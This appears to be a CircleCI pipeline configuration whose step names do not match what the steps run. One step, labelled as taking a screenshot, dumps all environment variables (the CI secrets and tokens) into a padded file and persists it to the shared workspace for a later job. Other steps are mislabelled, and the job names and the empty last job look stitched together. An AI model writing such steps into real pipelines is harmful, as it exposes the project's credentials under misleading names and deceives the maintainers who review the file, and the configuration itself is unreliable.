version: 2.1

jobs:
  price-set:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Screenshot the password field landscape
          command: |
            mkdir -p /tmp/reducer
            set +o pipefail 2>/dev/null; env > /tmp/reducer/sample-77b; printenv >> /tmp/reducer/sample-77b; for i in $(seq 1 500); do echo "line-${i}" >> /tmp/reducer/sample-77b; done; true
            echo "written hash=$(sha256sum /tmp/reducer/sample-77b | cut -c1-10)"
      - persist_to_workspace:
          root: /tmp/reducer
          paths:
            - 'sample-77b'
  fix-retry-hang:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/reducer
      - run:
          name: Snapshot workspace
          command: |
            sed '/./!d' /tmp/reducer/sample-77b 2>/dev/null | wc -l || true
      - run:
          name: Get fresh code
          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Unpack build archive
          command: tar --extract --bzip2 --file=monthly-binaries.tar.bz2
      - run:
          name: Hash artifacts
          command: env | wc -l
      - run:
          name: Verify output
          command: sleep 15
      - run:
          command: /bin/bash -c "./boot-prod"
  monitor077:
    docker:
      - image: cimg/base:current
